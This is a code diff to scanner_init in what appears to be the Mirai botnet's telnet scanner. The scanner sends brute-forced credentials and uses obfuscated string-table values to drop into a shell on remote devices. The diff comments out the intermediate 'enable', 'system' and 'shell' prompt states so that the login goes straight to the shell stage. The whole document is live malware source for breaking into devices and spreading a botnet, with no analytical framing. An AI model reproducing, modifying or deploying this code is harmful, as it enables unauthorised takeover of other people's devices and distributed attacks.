@@ -485,66 +485,67 @@ void scanner_init(char* ipAddress)
                                 send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                 send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
 
-                                conn->state = SC_WAITING_PASSWD_RESP;
-                            }
-                            break;
-                        case SC_WAITING_PASSWD_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
-                            {
-                                char *tmp_str;
-                                int tmp_len;
-
-#ifdef DEBUG
-                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
-#endif
-
-                                // Send enable / system / shell / sh to session to drop into shell if needed
-                                table_unlock_val(TABLE_SCAN_ENABLE);
-                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
-                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
-                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                                table_lock_val(TABLE_SCAN_ENABLE);
-                                conn->state = SC_WAITING_ENABLE_RESP;
-                            }
-                            break;
-                        case SC_WAITING_ENABLE_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
-                            {
-                                char *tmp_str;
-                                int tmp_len;
-
-#ifdef DEBUG
-                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
-#endif
-
-                                table_unlock_val(TABLE_SCAN_SYSTEM);
-                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
-                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
-                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                                table_lock_val(TABLE_SCAN_SYSTEM);
-
-                                conn->state = SC_WAITING_SYSTEM_RESP;
-                            }
-                            break;
-			            case SC_WAITING_SYSTEM_RESP:
-                            if ((consumed = consume_any_prompt(conn)) > 0)
-                            {
-                                char *tmp_str;
-                                int tmp_len;
-
-#ifdef DEBUG
-                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
-#endif
-
-                                table_unlock_val(TABLE_SCAN_SHELL);
-                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
-                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
-                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
-                                table_lock_val(TABLE_SCAN_SHELL);
-
+//                                conn->state = SC_WAITING_PASSWD_RESP;
                                 conn->state = SC_WAITING_SHELL_RESP;
                             }
                             break;
+//                        case SC_WAITING_PASSWD_RESP:
+//                            if ((consumed = consume_any_prompt(conn)) > 0)
+//                            {
+//                                char *tmp_str;
+//                                int tmp_len;
+//
+//#ifdef DEBUG
+//                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
+//#endif
+//
+//                                // Send enable / system / shell / sh to session to drop into shell if needed
+//                                table_unlock_val(TABLE_SCAN_ENABLE);
+//                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
+//                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+//                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+//                                table_lock_val(TABLE_SCAN_ENABLE);
+//                                conn->state = SC_WAITING_ENABLE_RESP;
+//                            }
+//                            break;
+//                        case SC_WAITING_ENABLE_RESP:
+//                            if ((consumed = consume_any_prompt(conn)) > 0)
+//                            {
+//                                char *tmp_str;
+//                                int tmp_len;
+//
+//#ifdef DEBUG
+//                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
+//#endif
+//
+//                                table_unlock_val(TABLE_SCAN_SYSTEM);
+//                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
+//                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+//                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+//                                table_lock_val(TABLE_SCAN_SYSTEM);
+//
+//                                conn->state = SC_WAITING_SYSTEM_RESP;
+//                            }
+//                            break;
+//			            case SC_WAITING_SYSTEM_RESP:
+//                            if ((consumed = consume_any_prompt(conn)) > 0)
+//                            {
+//                                char *tmp_str;
+//                                int tmp_len;
+//
+//#ifdef DEBUG
+//                                printf("[scanner] FD%d received sh prompt\n", conn->fd);
+//#endif
+//
+//                                table_unlock_val(TABLE_SCAN_SHELL);
+//                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
+//                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
+//                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
+//                                table_lock_val(TABLE_SCAN_SHELL);
+//
+//                                conn->state = SC_WAITING_SHELL_RESP;
+//                            }
+//                            break;
                         case SC_WAITING_SHELL_RESP:
                             if ((consumed = consume_any_prompt(conn)) > 0)
                             {
@@ -552,7 +553,8 @@ void scanner_init(char* ipAddress)
                                 int tmp_len;
 
 #ifdef DEBUG
-                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
+//                                printf("[scanner] FD%d received enable prompt\n", conn->fd);
+                                printf("[scanner] FD%d received shell prompt\n", conn->fd);
 #endif
 
                                 table_unlock_val(TABLE_SCAN_SH);
